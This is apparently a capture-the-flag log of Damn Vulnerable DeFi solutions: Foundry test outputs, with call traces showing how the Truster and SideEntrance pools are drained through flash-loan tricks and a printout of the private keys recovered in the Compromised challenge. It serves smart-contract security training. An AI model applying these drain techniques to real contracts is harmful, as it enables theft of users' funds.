```cmd
forge compile
```


- Unstoppable.sol

```shell
Sahbaazs-MacBook-Air:test skywarrior$ cd unstoppable/
Sahbaazs-MacBook-Air:unstoppable skywarrior$ forge test --match-test test_unstoppable
[⠊] Compiling...
[⠆] Compiling 189 files with Solc 0.8.25
[⠒] Solc 0.8.25 finished in 10.68s
Compiler run successful!

Ran 1 test for test/unstoppable/Unstoppable.t.sol:UnstoppableChallenge
[PASS] test_unstoppable() (gas: 67055)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 8.52ms (736.88µs CPU time)

Ran 1 test suite in 284.61ms (8.52ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

- NaiveReceiver
```shell
Sahbaazs-MacBook-Air:test skywarrior$ forge test --match-test test_naiveReceiver 
[⠊] Compiling...
[⠔] Compiling 1 files with Solc 0.8.25
[⠑] Solc 0.8.25 finished in 2.51s
Compiler run successful!

Ran 1 test for test/naive-receiver/NaiveReceiver.t.sol:NaiveReceiverChallenge
[PASS] test_naiveReceiver() (gas: 418085)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 13.41ms (5.50ms CPU time)

Ran 1 test suite in 252.04ms (13.41ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
Sahbaazs-MacBook-Air:test skywarrior$ 
```

- Truster

```shell
Sahbaazs-MacBook-Air:test skywarrior$ forge test --match-test test_truster -vvvv
[⠊] Compiling...
[⠒] Compiling 2 files with Solc 0.8.25
[⠢] Solc 0.8.25 finished in 2.03s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/truster/Truster.t.sol:55:9:
   |
55 |         Attack attack = new Attack(address(pool), address(token), address(recovery));
   |         ^^^^^^^^^^^^^


Ran 1 test for test/truster/Truster.t.sol:TrusterChallenge
[PASS] test_truster() (gas: 102261)
Traces:
  [129761] TrusterChallenge::test_truster()
    ├─ [0] VM::startPrank(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C])
    │   └─ ← [Return] 
    ├─ [80466] → new Attack@0xce110ab5927CC46905460D930CCa0c6fB4666219
    │   ├─ [43132] TrusterLenderPool::flashLoan(0, Attack: [0xce110ab5927CC46905460D930CCa0c6fB4666219], DamnValuableToken: [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b], 0x095ea7b3000000000000000000000000ce110ab5927cc46905460d930cca0c6fb466621900000000000000000000000000000000000000000000d3c21bcecceda1000000)
    │   │   ├─ [2519] DamnValuableToken::balanceOf(TrusterLenderPool: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]) [staticcall]
    │   │   │   └─ ← [Return] 1000000000000000000000000 [1e24]
    │   │   ├─ [4974] DamnValuableToken::transfer(Attack: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 0)
    │   │   │   ├─ emit Transfer(from: TrusterLenderPool: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], to: Attack: [0xce110ab5927CC46905460D930CCa0c6fB4666219], amount: 0)
    │   │   │   └─ ← [Return] true
    │   │   ├─ [24523] DamnValuableToken::approve(Attack: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 1000000000000000000000000 [1e24])
    │   │   │   ├─ emit Approval(owner: TrusterLenderPool: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], spender: Attack: [0xce110ab5927CC46905460D930CCa0c6fB4666219], amount: 1000000000000000000000000 [1e24])
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   ├─ [519] DamnValuableToken::balanceOf(TrusterLenderPool: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]) [staticcall]
    │   │   │   └─ ← [Return] 1000000000000000000000000 [1e24]
    │   │   └─ ← [Return] true
    │   ├─ [28428] DamnValuableToken::transferFrom(TrusterLenderPool: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa], 1000000000000000000000000 [1e24])
    │   │   ├─ emit Transfer(from: TrusterLenderPool: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], to: recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa], amount: 1000000000000000000000000 [1e24])
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   └─ ← [Return] 22 bytes of code
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    ├─ [0] VM::getNonce(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C]) [staticcall]
    │   └─ ← [Return] 1
    ├─ [0] VM::assertEq(1, 1, "Player executed more than one tx") [staticcall]
    │   └─ ← [Return] 
    ├─ [519] DamnValuableToken::balanceOf(TrusterLenderPool: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::assertEq(0, 0, "Pool still has tokens") [staticcall]
    │   └─ ← [Return] 
    ├─ [519] DamnValuableToken::balanceOf(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa]) [staticcall]
    │   └─ ← [Return] 1000000000000000000000000 [1e24]
    ├─ [0] VM::assertEq(1000000000000000000000000 [1e24], 1000000000000000000000000 [1e24], "Not enough tokens in recovery account") [staticcall]
    │   └─ ← [Return] 
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 8.44ms (1.35ms CPU time)

Ran 1 test suite in 799.38ms (8.44ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

- SideEntrance

```shell
c867c3e3-d55d-4ffa-9d79-563174161a37:test skywarrior$ forge test --match-test test_sideEntrance -vvvv
[⠊] Compiling...
[⠘] Compiling 2 files with Solc 0.8.25
[⠃] Solc 0.8.25 finished in 1.69s
Compiler run successful!

Ran 1 test for test/side-entrance/SideEntrance.t.sol:SideEntranceChallenge
[PASS] test_sideEntrance() (gas: 297234)
Traces:
  [317134] SideEntranceChallenge::test_sideEntrance()
    ├─ [0] VM::startPrank(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C])
    │   └─ ← [Return] 
    ├─ [186919] → new Attack@0xce110ab5927CC46905460D930CCa0c6fB4666219
    │   └─ ← [Return] 600 bytes of code
    ├─ [85664] Attack::attack()
    │   ├─ [38456] SideEntranceLenderPool::flashLoan(1000000000000000000000 [1e21])
    │   │   ├─ [31113] Attack::execute{value: 1000000000000000000000}()
    │   │   │   ├─ [23793] SideEntranceLenderPool::deposit{value: 1000000000000000000000}()
    │   │   │   │   ├─ emit Deposit(who: Attack: [0xce110ab5927CC46905460D930CCa0c6fB4666219], amount: 1000000000000000000000 [1e21])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Stop] 
    │   ├─ [8787] SideEntranceLenderPool::withdraw()
    │   │   ├─ emit Withdraw(who: Attack: [0xce110ab5927CC46905460D930CCa0c6fB4666219], amount: 1000000000000000000000 [1e21])
    │   │   ├─ [55] Attack::receive{value: 1000000000000000000000}()
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Stop] 
    │   ├─ [0] recovery::fallback{value: 1000000000000000000000}()
    │   │   └─ ← [Stop] 
    │   └─ ← [Return] true
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    ├─ [0] VM::assertEq(0, 0, "Pool still has ETH") [staticcall]
    │   └─ ← [Return] 
    ├─ [0] VM::assertEq(1000000000000000000000 [1e21], 1000000000000000000000 [1e21], "Not enough ETH in recovery account") [staticcall]
    │   └─ ← [Return] 
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 8.74ms (1.33ms CPU time)

Ran 1 test suite in 1.56s (8.74ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

- TheRewarder


```shell
c867c3e3-d55d-4ffa-9d79-563174161a37:test skywarrior$ forge test --match-test test_theRewarder -vv
[⠒] Compiling...
[⠃] Compiling 3 files with Solc 0.8.25
[⠊] Solc 0.8.25 finished in 2.84s
Compiler run successful!

Ran 1 test for test/the-rewarder/TheRewarder.t.sol:TheRewarderChallenge
[PASS] test_theRewarder() (gas: 1011597955)
Logs:
  1720

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.43s (4.39s CPU time)

Ran 1 test suite in 4.43s (4.43s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

- Selfie

```shell
ahbaazs-MacBook-Air:test skywarrior$ forge test --match-test test_selfie -vv
[⠊] Compiling...
[⠑] Compiling 2 files with Solc 0.8.25
[⠘] Solc 0.8.25 finished in 2.63s
Compiler run successful with warnings:
Warning (6321): Unnamed return variable can remain unassigned. Add an explicit return with value to all non-reverting code paths or name the variable.
  --> test/selfie/Attack.sol:45:63:
   |
45 |     function exploitSetup(address recovery) external returns (bool) {
   |                                                               ^^^^

Warning (6321): Unnamed return variable can remain unassigned. Add an explicit return with value to all non-reverting code paths or name the variable.
  --> test/selfie/Attack.sol:51:49:
   |
51 |     function exploitCloseup() external returns (bool) {
   |                                                 ^^^^

Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
  --> test/selfie/Attack.sol:30:26:
   |
30 |     function onFlashLoan(address initiator, address token,uint amount, uint fee, bytes calldata data) 
   |                          ^^^^^^^^^^^^^^^^^

Warning (2072): Unused local variable.
  --> test/selfie/Attack.sol:52:9:
   |
52 |         bytes memory resultData = simpleGovernance.executeAction(actionId);
   |         ^^^^^^^^^^^^^^^^^^^^^^^


Ran 1 test for test/selfie/Selfie.t.sol:SelfieChallenge
[PASS] test_selfie() (gas: 748158)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 8.94ms (1.55ms CPU time)

Ran 1 test suite in 251.85ms (8.94ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

- Compromised

```index.js
Sahbaazs-MacBook-Air:compromised skywarrior$ node index.js 
Private Key: 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744
Wallet address: 0x188Ea627E3531Db590e6f1D71ED83628d1933088
Private Key: 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159
Wallet address: 0xA417D473c40a4d42BAd35f147c21eEa7973539D8
```

```shell
Sahbaazs-MacBook-Air:test skywarrior$ forge test --match-test test_compromised -vv
[⠊] Compiling...
[⠃] Compiling 3 files with Solc 0.8.25
[⠊] Solc 0.8.25 finished in 2.86s
Compiler run successful with warnings:
Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
  --> test/compromised/Attack.sol:48:9:
   |
48 |         address operator, 
   |         ^^^^^^^^^^^^^^^^

Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
  --> test/compromised/Attack.sol:49:9:
   |
49 |         address from, 
   |         ^^^^^^^^^^^^

Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
  --> test/compromised/Attack.sol:50:9:
   |
50 |         uint256 tokenId, 
   |         ^^^^^^^^^^^^^^^

Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
  --> test/compromised/Attack.sol:51:9:
   |
51 |         bytes calldata data
   |         ^^^^^^^^^^^^^^^^^^^

Warning (2018): Function state mutability can be restricted to pure
  --> test/compromised/Attack.sol:47:5:
   |
47 |     function onERC721Received(
   |     ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for test/compromised/Compromised.t.sol:CompromisedChallenge
[PASS] test_compromised() (gas: 519349)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 9.35ms (1.44ms CPU time)
```

- Puppet 


- Puppet V2

```shell
bash-5.2$ forge test test/puppet-v2/PuppetV2.t.sol --mt test_puppetV2 
[⠒] Compiling...
[⠒] Compiling 4 files with Solc 0.8.25
[⠑] Solc 0.8.25 finished in 2.56s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
   --> test/puppet-v2/PuppetV2.t.sol:114:9:
    |
114 |         uint256 depositWETHRequired = lendingPool.calculateDepositOfWETHRequired(poolBalance);
    |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^


Ran 1 test for test/puppet-v2/PuppetV2.t.sol:PuppetV2Challenge
[PASS] test_puppetV2() (gas: 298621)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 15.69ms (2.20ms CPU time)

Ran 1 test suite in 283.16ms (15.69ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

- Puppet V3

```shell
bash-5.2$ export MAINNET_FORKING_URL=https://mainnet.infura.io/v3/YOUR_API_KEY
bash-5.2$    echo $MAINNET_FORKING_URL
https://mainnet.infura.io/v3/YOUR_API_KEY
bash-5.2$ forge test test/puppet-v3/PuppetV3.t.sol --mt test_puppetV3
[⠒] Compiling...
No files changed, compilation skipped

Ran 1 test for test/puppet-v3/PuppetV3.t.sol:PuppetV3Challenge
[PASS] test_puppetV3() (gas: 752095)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 22.87s (932.34ms CPU time)

Ran 1 test suite in 22.87s (22.87s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
bash-5.2$ 

```